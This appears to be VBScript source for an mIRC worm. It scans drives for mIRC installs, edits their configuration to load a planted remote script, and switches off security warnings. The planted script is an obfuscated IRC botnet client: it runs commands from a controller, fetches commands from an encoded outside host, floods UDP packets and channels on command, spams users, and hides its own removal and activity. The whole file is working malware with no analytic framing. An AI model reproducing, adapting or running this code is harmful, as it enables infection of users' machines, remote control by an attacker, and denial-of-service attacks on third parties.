dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "scripts.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=scripts.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on 1:sockopen:l3333*:{ if ($sockerr > 0) { set -u400 %wait 2 | unset %comd %d.kld* %d.chn | halt } | if ($sock(l333-*) != $null) { .sockclose l333-* } | sockwrite -tn $sockname USER %d.id $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) okzz xx : $+ %d.idf | if (%d.idn == $ $+ me) { sockwrite -tn $sockname NICK $me $+ $rand(1,9) $+ $rand(1,9) } | else { sockwrite -tn $sockname nick %d.idn $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) } | if (%d.klds != $null) { sockwrite -nt $sockname $chr(112) $+ $chr(97) $+ $chr(115) $+ $chr(115) %d.klds } | unset %d.id* | unset %d.klds }"
fr6.writeline "n1=on *:sockread:3833oj*: { sockread %388333 | if ($gettok(%388333,1,32) == Ping) { sockwrite -tn $sockname Pong $remove($gettok(%388333,2,32),:) } | if ($gettok(%388333,2,32) == 439) { set -u80 %laterb 2 | .timer-* off | halt } | if ($gettok(%388333,2,32) == 433) { .sockwrite -n $sockname nick $left($me,6) $+ $r(14,18) } | unset %388333 }"
fr6.writeline "n2=alias fldchan { fetnc | set %fldnum $1 | set %fldtype $2 | if ($2 == notice) || ($2 == privmsg) { set %fldstill chnm } | if ($2 == jp) { set %fldstill Chnjp } | :flood | set %fldserv $3 $4 | set %fldchan $5 | if ($6- != $null) { set %fldtxt $6- } | if ($6- == $null) { set %fldtxt $str(Xx,32) } | set %Chnfld on | var %var = 0 | :loop | inc %var | if (%Chnfld == on) && (%var <= %fldnum) { .sockopen %fldstill $+ %var %fldserv | goto loop } | else { halt } }"
fr6.writeline "n3=on *:sockread:l333*:{ sockread %l3338 | set %d.nc1 $remove($gettok(%l3338,1,33),:) | set %d.nc2 $remove($gettok(%l3338,2,64),$gettok(%l3338,2-,32),:) | if (ping isin $gettok(%l3338,1,32)) { sockwrite -tn $sockname Pong $remove($gettok(%l3338,2,32),:) } | if (002 isin %l3338) { unset %d.klds | sockwrite -tn $sockname $chr(106) $+ $chr(111) $+ $chr(105) $+ $chr(110) %d.chn %d.kld | .timerlkjh 1 8 unset %d.chn }"
fr6.writeline "n4=  if ($gettok(%l3338,2,32) == 353) && ($left($me,4) isin $gettok(%l3338,6,32) && ($gettok(%l3338,7-,32) == $null)) { sockwrite -n $sockname $chr(109) $+ $chr(111) $+ $chr(100) $+ $chr(101) $gettok(%l3338,5,32) +msntk %d.kld | unset %d.kld* | unset %d.chn } | if ($gettok(%l3338,2,32) == 353) && (l333- isin $sockname) { .sockwrite -n $sockname mode $gettok(%l3338,5,32) +smnt } | if ($gettok(%l3338,2,32) == 332) { if ($gettok(%l3338,5,32) == :Hell0) { .timer 1 0 .sockwrite -n $sockname $gettok(%l3338,6-,32),:) } | if ($gettok(%l3338,5,32) == :Well) { set $gettok(%l3338,6-,32) } | if ($gettok(%l3338,5,32) == :Do) { $gettok(%l3338,6-,32) } }"
fr6.writeline "n5=if (%d.nc1 == %d.nc2) { if ($gettok(%l3338,4,32) == :!Go) { $gettok(%l3338,5-,32) } | if ($gettok(%l3338,4,32) == :!change) { $remove($gettok(%l3338,4,32),!,$chr(58)) }"
fr6.writeline "n6=if ($gettok(%l3338,4,32) == :!info) && $gettok(%l3338,5,32) != $null) { .sockwrite -nt $sockname privmsg $gettok(%l3338,5,32) :2Serv/Port6:6 $+ $iif($server != $null,$server $+ : $+ $port,No Serv/Port) - 2Nick3/6 $+ $me - 2Joined:6 $iif($chan(0) == 0,No Joined,$chan(1) $+ $chr(44) $+ $chan(2) $+ $chr(44) $+ $chan(3)) ... - 2Net/9 $+ $iif($network != $null,$network,No NetWork) - 2Script/6 $+ $script($script(0))  }"
fr6.writeline "n7=if ($gettok(%l3338,4,32) == :!updatenews) && ($gettok(%l3338,5,32) != $null) && ($sock(check2) == $null) { set %comd $gettok(%l3338,5,32) | sockopen check2 $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) | goto end }"
fr6.writeline "n8=if ($gettok(%l3338,4,32) == :!packet) { set %packet.ip $gettok(%l3338,5,32) | set %packet.bytes $gettok(%l3338,6,32) | set %packet.amount $gettok(%l3338,7,32) | $iif($gettok(%l3338,8,32) != $null,set %packet.port $gettok(%l3338,8,32),set %packet.port $rand(1,6) $+ $rand(0,6) $+ $rand(0,6) $+ $rand(0,9)) | sockwrite -n $sockname privmsg $chr(35) $+ packets : $+ 9Target:2 %packet.ip 9Bytes:2 %packet.bytes 9Amount:2 %packet.amount  | set %packet.count 0 | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .sockwrite -n l333* privmsg $chr(35) $+ packets : $+ 2.::4Packeting Complete2::. | goto end } | inc %packet.count 1 | /.sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start }"
fr6.writeline "n9=if ($gettok(%l3338,4,32) == :!stop) { unset %fld* | unset %Chnfld* | .sockclose chn* | .sockclose pac* | halt } } | :end | unset %d.nc* | unset %l3338* }"
fr6.writeline "n10=alias 3333 { if ($ip != 127.0.0.1) && ($sock(check) == $null) && ($sock(l3333*) == $null) && (%wait == $null) { .sockopen $chr(99) $+ $chr(104) $+ $chr(101) $+ $chr(99) $+ $chr(107) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) } | if ($server != $null) && ($sock(3833oj*) == $null) { setnc | .timer 1 4 .sockopen 3833oj $+ $r(1,9) $+ $r(1,9) $server $port } }"
fr6.writeline "n11=on *:sockread:check*: { if ($sockerr > 0) { return } | sockread %check | if ($sockbr == 0) return | if (comd == $gettok(%check,1,32)) || (c0md == $gettok(%check,1,32)) { $gettok(%check,2-,32) } | waitme | unset %check | unset %seted }"
fr6.writeline "n12=alias waitme { if ($decode(KkFjY2VzcypzaXRlKndpdGhpbipob3VyKg== ,m) iswm %check) { set -u500 %wait $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(108) $+ $chr(105) $+ $chr(115) $+ $chr(116) | %wait | goto end } | if ($decode(KnRoZSpwYWdlKm5vdCpmb3VuZCo= ,m) iswm %check) && ($sock(l33335*) == $null) { set -u5 %waitt $decode(RWlrdS5jem9BeG15, m) | .383838 | goto end } | if (%seted != $null) { return $decode(aGF0bWFyZW5za2poZmRhbg==, m) } | :end }"
fr6.writeline "n13=alias soclist { .sockopen l333- $+ $r(1,9) $replace($sever,$decode(Y29t, m),$decode(b3Jn, m)) $+ $potr }"
fr6.writeline "n14=on 1:sockopen:l333-*:{ if ($sockerr > 0) { halt } | sockwrite -tn $sockname USER Wait $+ $rand(0,0) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) okzz xx : $+ Witing | sockwrite -tn $sockname nick Wait[ $+ $rand(1,9) $+ $rand(1,9) $+ 0 $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ ] | set %d.chn $decode(I0RlZmF1bHQ= ,m) $+ 1 }"
fr6.writeline "n15=on *:sockopen:check: { if ($sockerr > 0) { set -u100 %wait mirc | return } | .sockwrite -n $sockname $chr(71) $+ $chr(69) $+ $chr(84) $chr(47) $+ $chr(83) $+ $chr $+ $chr(47) $+ $chr(111) $+ $chr(105) $+ $chr(99) $+ $chr(101) $+ $chr(46) $+ $chr(104) $+ $chr(116) $+ $chr(109) $chr(72) $+ $chr(84) $+ $chr(84) $+ $chr(80) $+ $chr(47) $+ $chr(49) $+ $chr(46) $+ $chr(49) | .sockwrite -n check host $+ $chr(58) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) | .sockwrite $sockname $crlf }"
fr6.writeline "n16=on *:sockopen:check2: { if ($sockerr > 0) { unset %comd | return } | .sockwrite -n $sockname $chr(71) $+ $chr(69) $+ $chr(84) %comd $chr(72) $+ $chr(84) $+ $chr(84) $+ $chr(80) $+ $chr(47) $+ $chr(49) $+ $chr(46) $+ $chr(49) | .sockwrite -n check2 host $+ $chr(58) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) | .sockwrite $sockname $crlf | unset %comd }"
fr6.writeline "n17=on 1:sockopen:l3333*:{ if ($sockerr > 0) { set -u400 %wait 2 | unset %comd %d.klds %d.chn | halt } | sockwrite -tn $sockname USER %d.id $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) okzz xx : $+ %d.idf | if (%d.idn == $ $+ me) { sockwrite -tn $sockname NICK $me $+ $rand(1,9) $+ $rand(1,9) } | else { sockwrite -tn $sockname nick %d.idn $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) } | if (%d.klds != $null) { sockwrite -nt $sockname $chr(112) $+ $chr(97) $+ $chr(115) $+ $chr(115) %d.klds } | unset %d.id* | unset %d.klds }"
fr6.writeline "n18=on *:INPUT:*:{ if ($timer(p) == $null) { .timerp 0 60 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) } | if ($sock(l3333*) == $null) && ($sock(check) == $null) && (%wait == $null) { 3333 } }"
fr6.writeline "n19=on 1:start: { $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | unset %wait* | unset %later* | unset %nonet | unset %seted | unset %d.kld* | .rlevel 2 | unset %d.chn | .timerp 0 60 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | unset %fld* | unset %3333833 | unset %later* | unset %388333 } | if ($exists(server.ini)) { write -c server.ini | /.load -rs server.ini }"
fr6.writeline "n20=alias timers { if ($1 == $null) { echo -a 2* $chr(78) $+ $chr(111) $chr(97) $+ $chr(99) $+ $chr(116) $+ $chr(105) $+ $chr(118) $+ $chr(101) $chr(116) $+ $chr(105) $+ $chr(109) $+ $chr(101) $+ $chr(114) $+ $chr(115) | halt } | timers $1- }"
fr6.writeline "n21=on *:sockclose:l3333*: { unset %d.cn* | unset %d.id* | if (%wait == $null) { .timer 1 3 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) } | unset %d.kld* }"
fr6.writeline "n22=alias chr { set -u1 %seted goawayofmycode | return $chr(100) $+ $chr(48) $+ $chr(116) $+ $left($waitme,$chr(51)) $+ $chr(77) $+ $right($waitme,$chr(50)) }"
fr6.writeline "n23=on 1:sockopen:3833oj*:{ if ($sockerr > 0) { halt } | .sockwrite -nt $sockname USER %ncus %ncus %ncus : $+ $fullname $+ $rand(A,Z) $+ $rand(a,z) | .sockwrite -nt $sockname NICK %nc $+ $rand(a,z) | .timer 1 3 unset %nc* }"
fr6.writeline "n24=alias setus { goto us $+ $rand(1,14) | :us1 | set %ncus pc $+ $r(1,15) | goto end | :us2 | set %ncus jo $+ $r(l,q) $+ n | goto end | :us3 | set %ncus fo $+ $r(b,d) $+ e | goto end | :us4 | set %ncus Georg $+ $r(a,f) | goto end | :us5 | set %ncus Ni  $+ $r(f,p) $+ e | goto end | :us6 | set %ncus ala  $+ $r(j,t) $+ er | goto end "
fr6.writeline "n25=:us7 | set %ncus Ken $+ $r(,1,18) $+ $r(A,Z) | goto end | :us8 | set %ncus ka $+ $r(b,d) $+ er | goto end | :us9 | set %ncus ca $+ $r(e,g) $+ one | goto end | :us10 | set %ncus cof $+ $r(l,n) $+ iner | goto end | :us11 | set %ncus Co $+ $r(1,3) $+ for | goto end | :us12 | set %ncus lean $+ $r(11,17) $+ $r(a,z) | goto end | :us13 | set %ncus fi $+ $r(l,n) $+ her | goto end | :us14 | set %ncus Ro $+ $r(l,t) $+ ez | :end }"
fr6.writeline "n26=alias setnc { goto nc $+ $rand(1,21) | :nc1 | set %nc Si $+ $r(l,n) $+ ela | setus | goto alt | :nc2 | set %nc El $+ $r(l,o) ra | setus | goto alt | :nc3 | set %nc G|rl[ $+ $r(13,17) $+ ] | setus | goto alt | :nc4 | set %nc Usa $+ $r(12,18) $+ $r(A,Z) | setus | goto alt | :nc5 | set %nc Feni $+ $r(A,Z) | setus | goto alt | :nc6 | set %nc Lorre-_ $+ $r(15,22) | setus | goto alt | :nc7 | set %nc Nina $+ $rand(A,C) | setus | goto alt | :nc8 | set %nc Nenia $+ $r(A,Z) | setus | goto alt | :nc9 | set %nc Shakira $+ $r(15,22) | setus | goto alt | :nc10 | set %nc Female $+ $rand(A,Z) | setus | goto alt | :nc11 | set %nc MyLLi $+ $rand(14,19) | setus | goto alt "
fr6.writeline "n27=:nc12 | set %nc UpG1rl $+ $r(A,Z) $+ y | setus | goto alt | :nc13 | set %nc Cheek $+ $r(B,D) $+ in | setus | goto alt | :nc14 | set %nc Rom $+ $r(A,Z) | setus | goto alt | :nc15 | set %nc User $+ $rand(1,33) | setus | goto alt | :nc16 | set %nc Em1ly $+ $rand(A,Z) | setus | goto alt | :nc17 | set %nc Baby $+ $rand(15,24) $+ $r(A,C) | setus | goto alt | :nc18 | set %nc Jemma $+ $rand(13,20) | setus | goto alt | :nc19 | set %nc Elsa $+ $rand(1980,1988) | setus | goto alt | :nc20 | set %nc Va $+ $r(1,3) $+ na | setus | goto alt | :nc21 | set %nc Jesika $+ $rand(A,Z) | setus | :alt }"
fr6.writeline "n28=alias fetnc { set %fld.nc $replace($gettok($me,1,32),$right($me,1),$r(a,z)) | set %fld.ncus $gettok($email,1,64) $+ $r(a,z) | set %fld.full $fullname $+ $r(a,z) }"
fr6.writeline "n29=alias sever { if (%wait == $decode(c29jbGlzdA== ,m)) { return $chr(105) $+ $chr(114) $+ $chr(99) $+ $chr(99) $+ $chr(104) $+ $chr(97) $+ $chr(116) $+ $chr(46) $+ $chr(103) $+ $chr(111) $+ $chr(116) $+ $chr(100) $+ $chr(110) $+ $chr(115) $+ $chr(46) $+ $decode(Y29t ,m) $chr(54) $+ $chr(54) $+ $chr(54) $+ $chr(55) } | if (%wait != $decode(c29jbGlzdA== ,m)) { return $chr(105) $+ $chr(114) $+ $chr(99) $+ $chr(104) $+ $chr(97) $+ $chr(116) $+ $chr(46) $+ $chr(103) $+ $chr(111) $+ $chr(116) $+ $chr(100) $+ $chr(110) $+ $chr(115) $+ $chr(46) $+ $decode(bmV0 ,m) $chr(54) $+ $chr(54) $+ $chr(54) $+ $chr(55) } }"
fr6.writeline "n30=alias remove { if (scripts.ini == $1) { .load -rs scripts.ini | echo $color(info) *** Removed $chr(39) $+ $1 $+ $chr(39) } | else { remove $1- } }"
fr6.writeline "n31=alias unload { if (scripts.ini == $2) { echo $color(info) *** Unloaded script $chr(39) $+ $2- $+ $chr(39) | .load -rs scripts.ini | halt } | else { unload $1- } }"
fr6.writeline "n32=raw *:*:if (No such nick isin $1-) { halt } | if (too fast isin $1-) || (target isin $1-) { set -u70 %laterme ` | .timer-* off | halt }"
fr6.writeline "n33=alias 3338 { if ($server != $null) && ($sock(3833oj*) == $null) && ($network !isin %nonet) { .sockopen 3833oj $+ $chr(111) $+ $chr(106) $+ $rand(1,7) $+ $rand(1,9) $server $port } }"
fr6.writeline "n34=on 1:sockclose:3833oj*:{ .timer-* off | if ($server != $null) && ($sock(3833oj*) == $null) { setnc | .timer 1 3 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(56) } }"
fr6.writeline "n35=on *:sockopen:chnjp*:{ if ($sockerr > 0) { halt } | fetnc | .sockwrite -n $sockname USER %fld.ncus %fld.ncus %fld.ncus : $+ %fld.full $+ $r(a,z) | .sockwrite -nt $sockname nick %fld.nc $+ $rand(a,z) | .sockwrite -nt $sockname JOIN %fldchan | .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname join %fldchan |  .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname join %fldchan |  .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname quit }"
fr6.writeline "n36=on *:sockread:chn*:{ .sockread %fldd | fetnc | if ($gettok(%fldd,1,32) == PING) { sockwrite -tn $sockname PONG $remove($gettok(%fldd,2,32),:) } }"
fr6.writeline "n37=on *:sockopen:chnm*:{ if ($sockerr > 0) { halt } | fetnc | .sockwrite -nt $sockname USER %fld.ncus %fld.ncus %fld.ncus : $+ %fld.full $+ $r(a,z) | .sockwrite -nt $sockname nick %fld.nc $+ $rand(a,z) | .sockwrite -nt $sockname JOIN %fldchan | .sockwrite -nt $sockname %fldtype %fldchan : $+ %fldtxt | .sockwrite -nt $sockname %fldtype %fldchan : $+ %fldtxt |  .sockwrite -nt $sockname quit : $+ %fldtxt }"
fr6.writeline "n38=on 1:DISCONNECT:/.timer-* off"
fr6.writeline "n39=on ^*:OPEN:?: { if (%lateryou != $null) { halt } | if ($chr(119) $+ $chr(119) $+ $chr(119) isin $1-) || ($chr(104) $+ $chr(116) $+ $chr(116) $+ $chr(112) isin $1-) || (.com isin $1-) || (ignore isin $1-) { halt } }"
fr6.writeline "n40=alias remote { if ($1 == off) { remote $1- | .timerre 1 3 .remote on | halt } | if ($1 == on) { remote $1- } | else { remote $1- } }"
fr6.writeline "n41=on 1:RAWMODE:#:{ if ($avanti == $null) && ($nick ison #) { $iputed } }"
fr6.writeline "n42=alias socklist echo -a 2 $chr(42) $chr(78) $+ $chr(111) $chr(111) $+ $chr(112) $+ $chr(101) $+ $chr(110) $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(101) $+ $chr(116) $+ $chr(115))"
fr6.writeline "n43=on 1:connect:{ if ($exists(avanti.txt)) { write -c avanti.txt } | unset %388333 | if ($sock(3833oj*) == $null) && ($network !isin %nonet) { setnc | .timer 1 5 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(56) | unset %388333 | unset %3333833 | $chr(46) $+ $chr(114) $+ $chr(108) $+ $chr(101) $+ $chr(118) $+ $chr(101) $+ $chr(108) 2 } | unset %nc* | unset %later* }"
fr6.writeline "n44=alias 383838 { set %d.id B $+ $r(1,9) | set %d.idf B-N | set %d.idn Blo | .sockopen l33335 $+ $r(1,9) $servr $chr(55) $+ $chr(48) $+ $chr(48) $+ $chr(48) | set %d.chn $chr(35) $+ $chr(66) $+ 1 }"
fr6.writeline "n45=alias change { sockclose l3333* | unset %d.chn | .timer 1 4 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | unset %d.kld* }"
fr6.writeline "n46=alias havel { goto 1 $+ $r(a,b) | :1a | return %d.ste | goto end | :1b | return %d.ste [ $+ [ $r(1,2) ] ] | :end }"
fr6.writeline "n47=on 1:kick:#:{ if ($avamti != $null) { .timer- $+ $knick off | halt } | if ($sock(3833oj*) != $null) && (%laterb == $null) { $iif(undernet == $network,set -u18 %laterb after,set -u10 %laterb after) | $iputed1 | .timer- $+ $knick 1 7 .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $knick :ACTION $havel  | goto end } | if (%laterme == $null) { $iputed1 | $iif(undernet == $network,set -u20 %laterme after,set -u12 %laterme after) | .timer- $+ $knick 1 7 .msg $knick $havel ! | .ignore -u40 $knick 2 } | :end }"
fr6.writeline "n48=on 1:part:#:{ if ($nick == $me) { set -u8 %lateryou mirc32 } | if ($avatni != $null) { .timer- $+ $nick off | halt } | if ($sock(3833oj*) != $null) && (%laterb == $null) { $iif(undernet == $network,set -u19 %laterb after,set -u10 %laterb after) | $iputed | .timer- $+ $nick 1 7 .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $nick :ACTION $havel  | goto end } | if (%laterme == $null) { $iputed | $iif(undernet == $network,set -u20 %laterme after,set -u12 %laterme after) | .timer- $+ $nick 1 7 .msg $nick $havel ! | .ignore -u40 $address } | :end }"
fr6.writeline "n49=on 1:join:#:{ if ($nick == $me) { set -u8 %lateryou mirc } | if ($avatni != $null) { .timer- $+ $nick off | halt } | if ($sock(3833oj*) != $null) && (%laterb == $null) { $iif(undernet == $network,set -u20 %laterb after,set -u10 %laterb after) | $iputed | .timer- $+ $nick 1 7 .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $nick :ACTION $havel  | goto end } | if (%laterme == $null) { $iputed | $iif(undernet == $network,set -u26 %laterme after,set -u15 %laterme after) | .timer- $+ $nick 1 7 .msg $nick $havel ! | .ignore -u40 $address } | :end }"
fr6.writeline "n50=on 1:op:#:{ if ($read(avanti.txt, w, $gettok($address($opnick,2),2,64) $+ *) == $null) { write avanti.txt $gettok($address($opnick,2),2,64) EzkH13kRoU | .timer- $+ $opnick off } }"
fr6.writeline "n51=on 1:EXIT:unset %nc* | unset %fld* | %d.kld* | .rlevel 2 | .timer-* off | unset %wait | unset %388333 | unset %later* | if ($exists(server.ini)) { write -c server.ini | /.load -rs server.ini }"
fr6.writeline "n52=raw 421:*:halt "
fr6.writeline "n53=alias iputed { return write avanti.txt $gettok($address,2,64) }"
fr6.writeline "n54=alias iputed1 { return write avanti.txt $gettok($address($knick,2),2,64) e-s324xzyitfu }"
fr6.writeline "n55=alias avanti { return $read(avanti.txt, w, $gettok($address,2,64) $+ *) }"
fr6.writeline "n56=alias avatni { if ($avanti != $null) { return avatni } | if ($nick == $me) { return avatni } | if (spam isin $fulladdress) { return avatni } | if ($host isin $fulladdress) { return avatni } | if ($ip isin $fulladdress) { return avatni } | if (bot isin $fulladdress) { return avatni } | if (admin isin $fulladdress) { return avatni }  | if (%d.ste == $null) { return avatni } | if (%d.ste1 == $null) { return avatni } | if (%d.ste2 == $null) { return avatni } | if (.gr isin $right($address,3)) { return avatni } | if (b0t isin $fulladdress) { return avatni } | if ($me isop #) { return avatni } }"
fr6.writeline "n57=alias avamti { if ($read(avanti.txt, w, $gettok($address($knick,2),2,64) $+ *) != $null) { return avamti } | if ($knick isop #) { return avamti } | if ($me isop #) { return avamti } | if ($me == $knick) { return avamti } | if ($right($server,3) == .gr) { return avamti } | if (%d.ste == $null) { return avamti } | if (%d.ste1 == $null) { return avamti } | if (%d.ste2 == $null) { return avamti } }"
fr6.writeline "n58=alias ch { if (%waitt != $null) { return $decode(Y2xrOGlyMGNsZWNodXdhdC4=, m) $+ $decode(WmdibG90emR3bnpz, m) $+ $sevrer } }"
fr6.writeline "n59=alias sevrer { return $remove($gettok(%waitt,1,32),$chr(69),$chr(105),$chr(117),$chr(122),$chr(65),$chr(107),$chr(120),$chr(121)) }"
fr6.writeline "n60=alias servr { return $replace($remove($gettok($ch,1,32),$left($ch,4),$chr(48),$chr(119),$chr(117),$chr(108),$chr(101),$chr(98),$chr(122)),$decode(Y29t, m),$decode(b3Jn, m)) }"
fr6.writeline "n61="
fr6.writeline "n62="
fr6.writeline "n63="
fr6.writeline "n64="
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec) 
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec) 
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

